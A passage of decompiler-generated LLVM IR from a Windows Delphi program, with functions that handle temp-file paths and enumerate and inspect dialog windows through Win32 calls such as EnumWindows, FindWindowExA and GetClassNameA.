  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1616
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1616
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1616

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1597
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1617
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1618
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1618
  store i32 0, i32* %42, align 4, !insn.addr !1618
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1619
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1619
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1619
  store i32 %45, i32* %44, align 4, !insn.addr !1619
  %46 = call i32 @function_4034c8(), !insn.addr !1620
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1621
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1621
  store i32 %46, i32* %48, align 4, !insn.addr !1621
  %49 = call i32 @function_403720(), !insn.addr !1622
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1623
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1623
  store i32 %49, i32* %51, align 4, !insn.addr !1623
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1624
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1624
  store i32 %39, i32* %53, align 4, !insn.addr !1624
  %54 = call i32 @function_40446c(), !insn.addr !1625
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1626
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1626
  store i32 %39, i32* %56, align 4, !insn.addr !1626
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1627
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1628
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1628
  store i32 %39, i32* %59, align 4, !insn.addr !1628
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1629
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1630
  br label %dec_label_pc_406c0d, !insn.addr !1630

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1631
  %62 = load i32, i32* %61, align 4, !insn.addr !1631
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1632
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1633
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1633
  store i32 4221999, i32* %64, align 4, !insn.addr !1633
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1634
  ret i32 %65, !insn.addr !1635
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1636
  ret i32 %0, !insn.addr !1636
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1637
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1638
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1639
  %1 = call i32 @function_4036b8(), !insn.addr !1640
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1641
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1641
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1641
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1642
  %4 = call i32 @function_403c90(), !insn.addr !1643
  %5 = icmp slt i32 %4, 0, !insn.addr !1644
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1645

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1646
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1647
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1648
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1649
  %10 = call i32 @function_403c90(), !insn.addr !1650
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1651
  %12 = call i32 @function_403c90(), !insn.addr !1652
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1653
  %14 = call i32 @function_406b24(), !insn.addr !1654
  br label %dec_label_pc_406d38, !insn.addr !1654

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1655
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1656
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1657
  ret i32 %16, !insn.addr !1658
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1659
  ret i32 %0, !insn.addr !1659
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1660
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1661
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1661
  %3 = load i32, i32* %2, align 4, !insn.addr !1661
  ret i32 %3, !insn.addr !1662
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1663
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1663
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1663
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1664
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1665
  %3 = add i32 %2, 1, !insn.addr !1665
  %4 = icmp eq i32 %3, 0, !insn.addr !1665
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1665
  %5 = icmp eq i1 %4, false, !insn.addr !1666
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1666

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1667
  %7 = icmp eq i32 %6, 0, !insn.addr !1667
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1668

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1669
  br label %dec_label_pc_406d8c, !insn.addr !1669

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1670
  br label %dec_label_pc_406d9c, !insn.addr !1670

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1671
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1672
  ret i32 0, !insn.addr !1673
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1674
  ret i32 %0, !insn.addr !1674
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1675
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1676
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1677
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1677
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1677
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1678
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1679
  %3 = add i32 %2, -1, !insn.addr !1679
  %4 = icmp eq i32 %2, 0, !insn.addr !1679
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1679
  %5 = icmp eq i1 %4, false, !insn.addr !1680
  br i1 %5, label %dec_label_pc_406de8, label %dec_label_pc_406dce, !insn.addr !1680

dec_label_pc_406dce:                              ; preds = %dec_label_pc_406db4
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1681
  br label %dec_label_pc_406de8, !insn.addr !1682

dec_label_pc_406de8:                              ; preds = %dec_label_pc_406dce, %dec_label_pc_406db4
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1683
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1684
  ret i32 0, !insn.addr !1685
}

define i32 @function_406df6() local_unnamed_addr {
dec_label_pc_406df6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1686
  ret i32 %0, !insn.addr !1686
}

define i32 @function_406dfb() local_unnamed_addr {
dec_label_pc_406dfb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1687
}

define i32 @function_406dfd(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dfd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1688
}

define i1 @function_406e00(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406e00:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1689
  ret i1 %0, !insn.addr !1689
}

define i32 @function_406e08() local_unnamed_addr {
dec_label_pc_406e08:
  %eax.0.reg2mem = alloca i32, !insn.addr !1690
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1691
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1692
  %2 = icmp eq i32 %1, 0, !insn.addr !1693
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1694
  br i1 %2, label %dec_label_pc_406e3e, label %dec_label_pc_406e20, !insn.addr !1694

dec_label_pc_406e20:                              ; preds = %dec_label_pc_406e08
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1691
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1695
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1695
  %7 = load i8, i8* %6, align 1, !insn.addr !1695
  %8 = icmp eq i8 %7, 92, !insn.addr !1695
  br i1 %8, label %dec_label_pc_406e30, label %dec_label_pc_406e27, !insn.addr !1696

dec_label_pc_406e27:                              ; preds = %dec_label_pc_406e20
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1697
  store i8 92, i8* %9, align 1, !insn.addr !1697
  %10 = or i32 %3, 1, !insn.addr !1698
  %11 = add i32 %1, %10, !insn.addr !1698
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1698
  store i8 0, i8* %12, align 1, !insn.addr !1698
  br label %dec_label_pc_406e30, !insn.addr !1698

dec_label_pc_406e30:                              ; preds = %dec_label_pc_406e27, %dec_label_pc_406e20
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1699
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1699
  br label %dec_label_pc_406e3e, !insn.addr !1699

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e30, %dec_label_pc_406e08
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1700
}

define i32 @function_406e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e48:
  %esp.0.reg2mem = alloca i32, !insn.addr !1701
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1702
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1703
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1703
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1703
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1704
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1705
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1705
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1706
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1706
  %5 = icmp eq i1 %4, false, !insn.addr !1707
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1708
  br i1 %5, label %dec_label_pc_406eff, label %dec_label_pc_406e7f, !insn.addr !1708

dec_label_pc_406e7f:                              ; preds = %dec_label_pc_406e48
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1709
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1709
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1710
  %8 = icmp eq i32 %7, 32770, !insn.addr !1711
  %9 = icmp eq i1 %8, false, !insn.addr !1712
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1712
  br i1 %9, label %dec_label_pc_406eff, label %dec_label_pc_406e8e, !insn.addr !1712

dec_label_pc_406e8e:                              ; preds = %dec_label_pc_406e7f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1713
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1713
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1714
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1714
  %13 = add i32 %arg1, 4, !insn.addr !1715
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1715
  %15 = load i32, i32* %14, align 4, !insn.addr !1715
  %16 = icmp eq i32 %15, %12, !insn.addr !1715
  %17 = icmp eq i1 %16, false, !insn.addr !1716
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1716
  br i1 %17, label %dec_label_pc_406eff, label %dec_label_pc_406e99, !insn.addr !1716

dec_label_pc_406e99:                              ; preds = %dec_label_pc_406e8e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1717
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1717
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1718
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1719
  %21 = load i32, i32* %20, align 4, !insn.addr !1719
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1720
  %23 = icmp eq i32 %21, %22, !insn.addr !1720
  %24 = icmp eq i1 %23, false, !insn.addr !1721
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1721
  br i1 %24, label %dec_label_pc_406eff, label %dec_label_pc_406eaa, !insn.addr !1721

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e99
  %25 = add i32 %arg1, 8, !insn.addr !1722
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1722
  %27 = load i32, i32* %26, align 4, !insn.addr !1722
  %28 = icmp eq i32 %27, 0, !insn.addr !1722
  br i1 %28, label %dec_label_pc_406ed4, label %dec_label_pc_406eb0, !insn.addr !1723

dec_label_pc_406eb0:                              ; preds = %dec_label_pc_406eaa
  %29 = call i32 @function_407020(), !insn.addr !1724
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1725
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1726
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eff

dec_label_pc_406ed4:                              ; preds = %dec_label_pc_406eaa
  %32 = add i32 %arg1, 12, !insn.addr !1727
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1727
  %34 = load i32, i32* %33, align 4, !insn.addr !1727
  %35 = add i32 %arg1, 16, !insn.addr !1728
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1728
  %37 = load i32, i32* %36, align 4, !insn.addr !1728
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1729
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1729
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1729
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1729
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1729
  %43 = add i32 %arg1, 24, !insn.addr !1730
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1730
  store i32 %42, i32* %44, align 4, !insn.addr !1730
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1731
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1731
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1732
  %47 = icmp eq i1 %46, false, !insn.addr !1733
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1734
  br i1 %47, label %dec_label_pc_406eff, label %dec_label_pc_406efa, !insn.addr !1734

dec_label_pc_406efa:                              ; preds = %dec_label_pc_406ed4
  %48 = add i32 %arg1, 20, !insn.addr !1735
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1735
  store i32 %arg2, i32* %49, align 4, !insn.addr !1735
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1736
  br label %dec_label_pc_406eff, !insn.addr !1736

dec_label_pc_406eff:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406efa, %dec_label_pc_406ed4, %dec_label_pc_406e99, %dec_label_pc_406e8e, %dec_label_pc_406e7f, %dec_label_pc_406e48
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1737
  %51 = load i32, i32* %50, align 4, !insn.addr !1737
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1738
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1739
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1739
  store i32 4222753, i32* %53, align 4, !insn.addr !1739
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1740
  ret i32 %54, !insn.addr !1741
}

define i32 @function_406f1a() local_unnamed_addr {
dec_label_pc_406f1a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1742
  ret i32 %0, !insn.addr !1742
}

define i32 @function_406f1f() local_unnamed_addr {
dec_label_pc_406f1f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1743
}

define i32 @function_406f21(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f21:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1744
}

define i32 @function_406f2c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f2c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1745
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1746
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1747
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1747
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1747
  %6 = call i32 @function_40441c(), !insn.addr !1748
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1749
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1750
  br label %dec_label_pc_406f70, !insn.addr !1750

dec_label_pc_406f70:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f2c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1749
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1749
  store i32 %7, i32* %9, align 4, !insn.addr !1749
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1751
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1751
  store i32 4222536, i32* %11, align 4, !insn.addr !1751
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1752
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1753
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1753
  store i32 1, i32* %14, align 4, !insn.addr !1753
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1754
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1755
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1755
  store i32 0, i32* %16, align 4, !insn.addr !1755
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1756
  %18 = icmp eq i1 %17, false, !insn.addr !1757
  %19 = icmp eq i1 %18, false, !insn.addr !1758
  br i1 %19, label %dec_label_pc_406f9a, label %dec_label_pc_406f8f, !insn.addr !1758

dec_label_pc_406f8f:                              ; preds = %dec_label_pc_406f70
  %20 = call i32 @function_40441c(), !insn.addr !1759
  %21 = sub i32 %20, %6, !insn.addr !1760
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1761
  %23 = icmp eq i1 %22, false, !insn.addr !1762
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1762
  br i1 %23, label %dec_label_pc_406f70, label %dec_label_pc_406f9a, !insn.addr !1762

dec_label_pc_406f9a:                              ; preds = %dec_label_pc_406f8f, %dec_label_pc_406f70
  ret i32 0, !insn.addr !1763
}

define i32 @function_406fb4() local_unnamed_addr {
dec_label_pc_406fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1764
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1765
}

define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1766
  %edi.0.reg2mem = alloca i32, !insn.addr !1766
  %ecx.0.reg2mem = alloca i32, !insn.addr !1766
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1767
  br label %2, !insn.addr !1767

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1767
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1767
  br i1 %3, label %10, label %4, !insn.addr !1767

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1767
  %6 = load i8, i8* %5, align 1, !insn.addr !1767
  %7 = icmp eq i8 %6, 0, !insn.addr !1767
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1767
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1767
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1767
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1767
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1767
  br i1 %7, label %10, label %2, !insn.addr !1767

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1768
  ret i32 %11, !insn.addr !1769
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1770
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1771
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1771
  %4 = add i32 %3, %1, !insn.addr !1772
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1772
  store i8 0, i8* %5, align 1, !insn.addr !1772
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1773
  ret i32 %6, !insn.addr !1774
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1775
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1776
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1777
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1777
  %6 = add i32 %5, %3, !insn.addr !1778
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1778
  store i8 0, i8* %7, align 1, !insn.addr !1778
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1779
  ret i32 %8, !insn.addr !1780
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1781
  %1 = call i32 @function_4034c8(), !insn.addr !1782
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1783
  ret i32 %2, !insn.addr !1784
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1785
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1786
  ret i32 %1, !insn.addr !1787
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1788
  %1 = call i32 @function_4036c8(), !insn.addr !1789
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1790
  %3 = icmp eq i32 %2, 2, !insn.addr !1791
  %4 = zext i1 %3 to i32, !insn.addr !1792
  %5 = and i32 %2, -256, !insn.addr !1792
  %6 = or i32 %5, %4, !insn.addr !1792
  ret i32 %6, !insn.addr !1793
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1794
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1794
  %esp.02.reg2mem = alloca i32, !insn.addr !1794
  %storemerge3.reg2mem = alloca i32, !insn.addr !1794
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1795
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1795
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1795
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1796
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1797
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1798
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1798
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1799
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1799
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1799
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1800
  %9 = icmp eq i1 %8, false, !insn.addr !1801
  %10 = icmp eq i1 %9, false, !insn.addr !1802
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1802
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1802
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1802
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1802
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1802

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1803
  %12 = call i32 @function_407134(), !insn.addr !1804
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1805
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1805
  store i32 2, i32* %14, align 4, !insn.addr !1805
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1806
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1806
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1806
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1807
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1799
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1799
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1800
  %21 = icmp eq i1 %20, false, !insn.addr !1801
